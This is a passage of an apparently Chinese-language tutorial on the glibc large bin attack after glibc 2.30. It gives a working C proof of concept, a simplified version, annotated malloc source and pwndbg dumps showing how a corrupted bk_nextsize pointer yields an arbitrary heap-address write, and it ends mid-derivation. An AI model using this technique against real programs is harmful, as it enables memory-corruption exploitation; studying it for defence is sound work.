
```C
#include<stdio.h>
#include<stdlib.h>
#include<assert.h>
/*
A revisit to large bin attack for after glibc2.30
Relevant code snippet :
if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
fwd = bck;
bck = bck->bk;
victim->fd_nextsize = fwd->fd;
victim->bk_nextsize = fwd->fd->bk_nextsize;
fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
}
*/
int main(){
/*Disable IO buffering to prevent stream from interfering with heap*/
setvbuf(stdin,NULL,_IONBF,0);
setvbuf(stdout,NULL,_IONBF,0);
setvbuf(stderr,NULL,_IONBF,0);
printf("\n\n");
printf("Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n");
printf("Check 1 : \n");
printf("> if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
printf("> malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n");
printf("Check 2 : \n");
printf("> if (bck->fd != fwd)\n");
printf("> malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n");
printf("This prevents the traditional large bin attack\n");
printf("However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n");
printf("====================================================================\n\n");
size_t target = 0;
printf("Here is the target we want to overwrite (%p) : %lu\n\n",&target,target);
size_t *p1 = malloc(0x428);
printf("First, we allocate a large chunk [p1] (%p)\n",p1-2);
size_t *g1 = malloc(0x18);
printf("And another chunk to prevent consolidate\n");
printf("\n");
size_t *p2 = malloc(0x418);
printf("We also allocate a second large chunk [p2] (%p).\n",p2-2);
printf("This chunk should be smaller than [p1] and belong to the same large bin.\n");
size_t *g2 = malloc(0x18);
printf("Once again, allocate a guard chunk to prevent consolidate\n");
printf("\n");
free(p1);
printf("Free the larger of the two --> [p1] (%p)\n",p1-2);
size_t *g3 = malloc(0x438);
printf("Allocate a chunk larger than [p1] to insert [p1] into large bin\n");
printf("\n");
free(p2);
printf("Free the smaller of the two --> [p2] (%p)\n",p2-2);
printf("At this point, we have one chunk in large bin [p1] (%p),\n",p1-2);
printf(" and one chunk in unsorted bin [p2] (%p)\n",p2-2);
printf("\n");
p1[3] = (size_t)((&target)-4);
printf("Now modify the p1->bk_nextsize to [target-0x20] (%p)\n",(&target)-4);
printf("\n");
size_t *g4 = malloc(0x438);
printf("Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n", p2-2, p2-2);
printf("Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\n");
printf(" the modified p1->bk_nextsize does not trigger any error\n");
printf("Upon inserting [p2] (%p) into largebin, [p1](%p)->bk_nextsize->fd->nexsize is overwritten to address of [p2] (%p)\n", p2-2, p1-2, p2-2);
printf("\n");
printf("In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n", p2-2, (void *)target);
printf("Target (%p) : %p\n",&target,(size_t*)target);
printf("\n");
printf("====================================================================\n\n");
assert((size_t)(p2-2) == target);
return 0;
}
```

简化版本：

```C
#include<stdio.h>
#include<stdlib.h>
#include<assert.h>
int main(){
size_t target = 0;
size_t *p = malloc(0x420);
size_t *pad = malloc(0x8);
size_t *victim = malloc(0x410);
free(p);
malloc(0x430); //bigger than p
free(victim);
p[3] = (size_t)(&target-4);
malloc(0x430); //bigger than victim and p
assert(target == (size_t)(victim-2));
return 0;
}
```

### pwndbg调试

在`p`和`victim`直接申请的小chunk是为了防止与top chunk合并。

`free(p)`之后，`p`被放入`unsorted bin`。之后再申请一个大于`p`大小的`chunk`，在遍历`unsorted bin`的时候就会将`p`放入`large bin`。

`free(victim)`之后，`victim`被放入`unsorted bin`。

下一行`p[3] = (size_t)(&target-4);`的意思是，`p`的`bk_nextsize`指针指向`(&target-4)`。也就是伪造一个`fake_chunk`，`fake_chunk`的`fd_nextsize`指针存放的是目标地址`target`。如下图。

![](upload/attach/202204/882497_7Q5KREHRQTASMJH.png)

`p->bk_nextsize`指向了`fake_chunk->fd_nextsize`，也就是`target`。

![](upload/attach/202204/882497_UGB4YDHREXHEKA8.png)

```shell
pwndbg> p p
$2 = (size_t *) 0x5555557572a0
pwndbg> x/8gx 0x555555757290
0x555555757290: 0x0000000000000000 0x0000000000000431
0x5555557572a0: 0x00007ffff7dbf0b0 0x00007ffff7dbf0b0
0x5555557572b0: 0x0000555555757290 0x0000555555757290
0x5555557572c0: 0x0000000000000000 0x0000000000000000
```

修改之后：

![](upload/attach/202204/882497_XK7RN7JA38EEMMM.png)

```shell
pwndbg> x/8gx 0x555555757290
0x555555757290: 0x0000000000000000 0x0000000000000431
0x5555557572a0: 0x00007ffff7dbf0b0 0x00007ffff7dbf0b0
0x5555557572b0: 0x0000555555757290 0x00007fffffffd968(这里改掉了，改成了fake_chunk)
0x5555557572c0: 0x0000000000000000 0x0000000000000000
```

那么，接下来再`malloc`一个比`p`和`victim`都大的`chunk`的时候，会将`victim`链入`large bin`。存放`victim`的时候，`victim`直接插入链表尾，所以原本是将`victim->fd_nextsize`指向链表头的最大`chunk`（这里也就是`p`）。观察一下代码：

从这里正式进入了`victim`放进`large bin`操作。

![](upload/attach/202204/882497_VSSQWBQFJ7GACP3.png)

```C
//如果是large bin中的chunk
else
{
//获取bin的索引
victim_index = largebin_index (size);
//链表头作为bck
bck = bin_at (av, victim_index);
//链表头的下一个chunk，即链表的第一个chunk作为fwd
fwd = bck->fd;
/* maintain large bins in sorted order */
//如果fwd != bck，说明链表非空，要按顺序存放
if (fwd != bck)
{
/* Or with inuse bit to speed comparisons */
size |= PREV_INUSE;
/* if smaller than smallest, bypass loop below */
assert (chunk_main_arena (bck->bk));
//如果victim的大小小于链表的最后一个chunk，直接插入链表尾
if ((unsigned long) (size)
< (unsigned long) chunksize_nomask (bck->bk))
{
//链表头作为它的fwd
fwd = bck;
//前一个chunk作为它的bck
bck = bck->bk;
//设置victim的fd_nextsize指向链表头的下一个chunk，即bin中第一个，最大的chunk
victim->fd_nextsize = fwd->fd;
//在插入它之前，链表第一个chunk的bk_nextsize指向原来最小的chunk
//设置victim的bk_nextsize指向比它大的最小chunk的第一个
//也就是fwd->fd->bk_nextsize
victim->bk_nextsize = fwd->fd->bk_nextsize;
//设置链表第一个chunk的bk_nextsize
//和victim->bk_nextsize->fd_nextsize
//也就是比它大的最小chunk的第一个的fd_nextsize
//都指向victim
fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
}
//如果不是最小的话，寻找合适的位置插入
else
{
assert (chunk_main_arena (fwd));
//遍历链表，寻找比victim大的最小chunk
while ((unsigned long) size < chunksize_nomask (fwd))
{
//通过fd_nextsize进行遍历
//加快速度
fwd = fwd->fd_nextsize;
assert (chunk_main_arena (fwd));
}
//如果有相等的
if ((unsigned long) size
== (unsigned long) chunksize_nomask (fwd))
/* Always insert in the second position. */
//为了不改变nextsize链表
//插入在它后面作为这个相同size的第二个
fwd = fwd->fd;
//如果没有相等的
//也就是这个size的chunk只有victim一个
//就要修改nextsize链表了
else
{
//设置victim的fd_nextsize指向上一个比他大的最小chunk的第一个
victim->fd_nextsize = fwd;
//设置victim的bk_nextsize指向原本fwd的下一个大小的chunk
victim->bk_nextsize = fwd->bk_nextsize;
if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
//上一个比他大的最小chunk的第一个的bk_nextsize指向victim
fwd->bk_nextsize = victim;
//原本fwd的下一个大小的chunk的fd_nextsize指向victim
victim->bk_nextsize->fd_nextsize = victim;
}
bck = fwd->bk;
//检查bck->fd是否等于fwd
if (bck->fd != fwd)
malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
}
}
//链表为空的情况
else
victim->fd_nextsize = victim->bk_nextsize = victim;
}
mark_bin (av, victim_index);
//设置fd和bk指针
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;
```

摘出需要的部分：

```C
if ((unsigned long) (size)
< (unsigned long) chunksize_nomask (bck->bk))
{
fwd = bck;
bck = bck->bk;
victim->fd_nextsize = fwd->fd;
victim->bk_nextsize = fwd->fd->bk_nextsize;
fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
}
```

查看一下各变量里面都是什么。

```shell
pwndbg> p fwd->fd
$3 = (struct malloc_chunk *) 0x555555757290（也就是p）
pwndbg> p fwd->fd->bk_nextsize
$4 = (struct malloc_chunk *) 0x7fffffffd968（也就是fake_chunk）
pwndbg> p victim
$5 = (mchunkptr) 0x5555557576e0
```

推导一下：
`fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;`
